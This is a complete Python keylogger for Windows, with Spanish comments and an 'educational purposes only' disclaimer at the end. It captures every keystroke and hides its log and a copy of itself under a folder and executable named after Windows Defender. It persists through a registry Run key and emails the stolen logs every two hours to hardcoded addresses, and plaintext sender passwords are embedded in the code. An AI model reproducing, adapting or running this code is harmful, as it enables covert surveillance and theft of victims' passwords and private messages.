#██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
#██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
#█████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
#██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
#██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
#╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝
#░██╗░░░░░░░██╗██╗███╗░░██╗██████╗░░█████╗░░██╗░░░░░░░██╗░██████╗
#░██║░░██╗░░██║██║████╗░██║██╔══██╗██╔══██╗░██║░░██╗░░██║██╔════╝
#░╚██╗████╗██╔╝██║██╔██╗██║██║░░██║██║░░██║░╚██╗████╗██╔╝╚█████╗░
#░░████╔═████║░██║██║╚████║██║░░██║██║░░██║░░████╔═████║░░╚═══██╗
#░░╚██╔╝░╚██╔╝░██║██║░╚███║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░██████╔╝
#░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═════╝░ v3.2

# Librerías Utilizadas
from pynput.keyboard import Key, Listener
import pynput
from getpass import getuser # Obtiene el nombre del usuario
from datetime import datetime
import datetime
import os
import yagmail
import shutil
from winreg import *
# Librería verifica internet 
import socket
import time
import threading # Hilos

# Convierte tecla a un valor legible
def KeyConMin(argument):                # Caracteres Comunes // Optimizados
    switcher = {
        # Vocales Minisculas
        "'a'": "a",
        "'e'": "e",
        "'i'": "i",
        "'o'": "o",
        "'u'": "u",
        # Letras  Minusculas
        "'b'": "b",
        "'c'": "c",
        "'d'": "d",
        "'f'": "f",
        "'g'": "g",
        "'h'": "h",
        "'j'": "j",
        "'J'": "J",
        "'k'": "k",
        "'l'": "l",
        "'m'": "m",
        "'n'": "n",
        "'ñ'": "ñ",
        "'p'": "p",
        "'q'": "q",
        "'r'": "r",
        "'s'": "s",
        "'t'": "t",
        "'v'": "v",
        "'w'": "w",
        "'x'": "x",
        "'y'": "y",
        "'z'": "z",
        # Caracteres
        "','": ",",                     # ,
        "'.'": ".",                     # .
        "'_'": "_",                     # _
        "'-'": "-",                     # -
        "':'": ":",                     #
        # Vocales Mayúsculas
        "'A'": "A",
        "'E'": "E",
        "'I'": "I",
        "'O'": "O",
        "'U'": "U",
        # Letras Mayúsculas
        "'B'": "B",
        "'C'": "C",
        "'D'": "D",
        "'F'": "F",
        "'G'": "G",
        "'H'": "H",
        "'K'": "K",
        "'L'": "L",
        "'M'": "M",
        "'N'": "N",
        "'Ñ'": "Ñ",
        "'P'": "P",
        "'Q'": "Q",
        "'R'": "R",
        "'S'": "S",
        "'T'": "T",
        "'V'": "V",
        "'W'": "W",
        "'X'": "X",
        "'Y'": "Y",
        "'Z'": "Z",
        # Números Standard
        "'1'": "1",
        "'2'": "2",
        "'3'": "3",
        "'4'": "4",
        "'5'": "5",
        "'6'": "6",
        "'7'": "7",
        "'8'": "8",
        "'9'": "9",
        "'0'": "0",
        # Caracteres Especiales
        "'@'": "@",                     # @
        "'#'": "#",                     # #
        "'*'": "*",                     #
        "'('": "(",                     # (
        "')'": ")",                     # )
        "'?'": "?",                     # ?
        "'='": "=",                     # =
        "'+'": "+",                     # +
        "'!'": "!",                     # !
        "'}'": "}",                     # }
        "'{'": "{",                     # {}
        "'´'": "´",                     # ´
        "'|'": "|",                     # |
        "'°'": "°",                     # °
        "'^'": "¬",                     # ^
        "';'": ";",                     #
        "'$'": "$",                     # $
        "'%'": "%",                     # %
        "'&'": "&",                     # &
        "'>'": ">",                     #
        "'<'": "<",                     # 
        "'/'": "/",                     # /
        "'¿'": "¿",                     # ¿
        "'¡'": "¡",                     # ¡
        "'~'": "~"                      #
    }
    return switcher.get(argument, "")

# Convierte tecla a un valor legible
def KeyConMax(argument):                # Botones, comunes // Optimizados
    switcher = {
        "Key.space": " ",               # Espacio
        "Key.backspace": "«",           # Borrar
        "Key.enter": "\r\n",            # Salto de linea
        "Key.tab": "    ",              # Tabulación
        "Key.delete":" «×» ",           # Suprimir
        # Números
        "<96>": "0",                 # 0
        "<97>": "1",                 # 1
        "<98>": "2",                 # 2
        "<99>": "3",                 # 3
        "<100>": "4",                # 4
        "<101>": "5",                # 5
        "<102>": "6",                # 6
        "<103>": "7",                # 7
        "<104>": "8",                # 8
        "<105>": "9",                # 9
        # Números Númeral
        "None<96>": "0",                 # 0
        "None<97>": "1",                 # 1
        "None<98>": "2",                 # 2
        "None<99>": "3",                 # 3
        "None<100>": "4",                # 4
        "None<101>": "5",                # 5
        "None<102>": "6",                # 6
        "None<103>": "7",                # 7
        "None<104>": "8",                # 8
        "None<105>": "9",                # 9
        # Teclas raras 2 
        "['^']": "^",
        "['`']": "`",                     #
        "['¨']": "¨",                     #
        "['´']": "´",                     #
        "<110>": ".",                     #
        "None<110>": ".",                 #
        "Key.alt_l": " [Alt L] ",         #
        "Key.alt_r": " [Alt R] ",
        #"Key.shift_r": " [Shift R] ",
        #"Key.shift": " [Shift L] ",
        "Key.ctrl_r": " [Control R] ",    #
        "Key.ctrl_l": " [Control L] ",    #
        "Key.right" : " [Right] ",                 #
        "Key.left"  : " [Left] ",                  #
        "Key.up"    : " [Up]",                    #
        "Key.down"  : " [Down] ",                  #
        #"'\x16'"  : " [Pegó] ",
        #"'\x18'"  : " [Cortar] ", 
        #"'\x03'"  : " [Copiar] ", 
        "Key.caps_lock"  : " [Mayus lock] ",  
        #"Key.media_previous"    : " ♫ ",     #
        #"Key.media_next"        : " ♫→ ",         #
        #"Key.media_play_pause"  : " ■ ♫ ■ ",#
        "Key.cmd"               : " [Windows] "          #
    }
    return switcher.get(argument, "")

# Obtiene registro de teclas y guarda en un archivo log.txt
def Klogger():
    try:        # Intenta crear el archivo
        log = os.environ.get(
        'pylogger_file',
        os.path.expanduser('C:\\Users\\Public\\Security\\Windows Defender\\log.txt')
        )
    
        T = datetime.datetime.now()
        getTime = "Fecha:      ["+  T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + "]\nHora:       [" + T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")+ " con " + T.strftime("%S") +" Segundos]\n"

        with open (log, "a") as f:
            f.write("\n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
    except: # Si no puede crear el archivo, crea el directorio faltante
        CreateDir()  # Function: Crea el directorio ==> C:\Users\Public\Security\Windows Defender
    
    def on_press(key):
        with open(log, "a") as f:
            if (len(str(key)))  <= 3:
                #print("[KeyConMin]")
                print(KeyConMin(str(key)))
                f.write(KeyConMin(str(key)))
            else:
                #print("[KeyConMax]")
                print(KeyConMax(str(key)))
                f.write(KeyConMax(str(key)))
    with Listener(on_press=on_press) as listener:   # Escucha pulsaciones de teclas
        listener.join() 

# Envía los datos log.txt vía Gmail 
def sendEmail(log, sender_email, sender_password, receiver_email):
    try:
        mifecha                 = datetime.datetime.now()
        subject                 = "Data User: "+ str(getuser()) 
        # Inicia Sesión 
        yag = yagmail.SMTP(user=sender_email, password=sender_password)
        informacion = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
        # Cuerpo del mensaje
        contents = [ 
            "Información:\n\nNombre de Usuario: "+ str(getuser()) + informacion
        ]
        yag.send(receiver_email, subject, contents, attachments=log )
        print("[+] Se envió el correo correctamente")
        return True;
    except:
        print("[-] No se pudo envíar el correo")
        return False

# Renombre el archivo log, antes de ser envíado
def Rename(name):
    try:
        CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
        # Copia el archivo 
        pathO = "C:\\Users\\Public\\Security\\Windows Defender\\log.txt"
        pathN= "C:\\Users\\Public\\Security\\Windows Defender\\"+ name + ".txt"
        os.rename(pathO, pathN)
    except:
        pass

# Función = Verifica si hay conexión a internet para poder envíar el log
def VerificarConexion():
    con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # Creamos el socket de conexion
    try:                                                            # Intenta conectarse al servidor de Google
        con.connect(('www.google.com', 80))
        con.close()
        return True
    except:
        return False

# Crea el directorio oculto 
def CreateDir():
    try:  # Intenta crear la dirección
        os.makedirs('C:\\Users\\Public\\Security\\Windows Defender')
    except :
        pass

# Cópia él Keylogger a la carpeta oculta 
def EscondeKey():
    CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
    nameKey = "WindowsDefender.exe"
    filePath = "C:\\Users\\Public\\Security\\Windows Defender\\"+ nameKey

    try:
        with open(filePath, 'r') as f:      # Verifica si el keylogger se encuentra oculto en el sistema
            print("El keylogger ya se encuentra en la carpeta oculta")
    except :
        print("El Keylogger no se encuentra en el sistema, y tratará de copiarlo")
        try:
            shutil.copy(nameKey , filePath) # Intenta ocultar el keylogger en una carpeta
            print("El keylogger se escondió exitosamente en el sistema")
        except:
            print("No se puedo esconder el Keylogger en el sistema")

# Intervalo de tiempo que se enviará el archivo log.txt
def SendLog():
    n = 1   # Para renombre los archivos
    while (True):
        n = n+1

        # Correo de envío [Principal]      <=> Se enviará 
        sender_email_P       = "eneboltest@zohomail.com"   # <<== Cambia éste correo
        sender_password_P    = "Y6dvxnd@"          # <<== Contraseña del correo 

        # Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
        sender_email_S       = "eneboltest2022@gmail.com"   # <<== Cambia éste correo
        sender_password_S    = "Y6dvxnd@"          # <<== Contraseña del correo 

        # Correo o correos que recibirán el registro de datos `log.txt`
        receiver_email   = ["eneboltest@zohomail.com","mytestemail212121@gmail.com"] # MultiCorreo
      # receiver_email   = ["correo@gmail.com"]  # SingleCorreo

        # Enviar cada 2 horas aprox
        for x in range(720):    #720
            time.sleep(10) # *10 
            #print("Pasó: "+ str(x*10))

        if VerificarConexion(): # Continua solo si hay conexión
            # Crea nombre del archivo
            nameFile = "log"+str(n)
            #Renombra el archivo original
            Rename(nameFile)    # Cambia el archivo `log.txt` a  `log2.txt`

            #Envía el archivo renombrado
            CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
            homedir = 'C:\\Users\\Public\\Security\\Windows Defender\\'+str(nameFile)+".txt"
            print("Proceso de envío")

            if sendEmail(homedir, sender_email_P, sender_password_P , receiver_email):    # Envía con el primer correo
                #Si se envíó correctamente, pues elimina el archivo
                os.remove(homedir)
            elif sendEmail(homedir, sender_email_S, sender_password_S , receiver_email):  # Envía con el segundo correo 
                os.remove(homedir)
        else:   # No hay conexión
            # Seguirá sobreescribiendo el archivo
            # No hará nada, y esperará que aya una conexión exitosa
            pass
        
def addStartup():  # function =  Iniciar automaticamente
    path = r"C:\Users\Public\Security\Windows Defender\WindowsDefender.exe" # Path del Software completo
    name = "Windows Defender"                                                       # Nombre del StartUp
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
    def verificar():
        try:  # Intenta crear la dirección
            os.makedirs('C:\\Users\\Public\\Security\\Microsoft')
            return True # Se creó la carpeta
        except:
            return False# La carpeta ya existe
    try:    # Solo si tiene permisos de administrador
        registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS) # machine
        SetValueEx(registry,name, 0, REG_SZ, path)
        verificar() # Crea Carpeta
    except: # Si no tien permisos de administrador
        if (verificar()):
            registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
            SetValueEx(registry,name, 0, REG_SZ, path)
           
    

# Inicio multihilo
if __name__ == '__main__':
    
    EscondeKey()    # Se replica dentro de la computadora
    addStartup()    # Modifica registro
    p1 = threading.Thread(target=Klogger)
    p2 = threading.Thread(target=SendLog)
    p2.start()
    p1.start()
    p1.join()

#################################################################
#                                                               #
#                 Developed by SebastianEPH                     #
#                                                   v.3.2       #
#################################################################
# Notas importantes
#
# *** Éste script fue creado solo con fines educativos, por ese detalle el script está documentado, no me hago responsabe por un posible mal uso de éste script***
#
# Lea la documentación en: https://github.com/SebastianEPH/Keylogger_Python

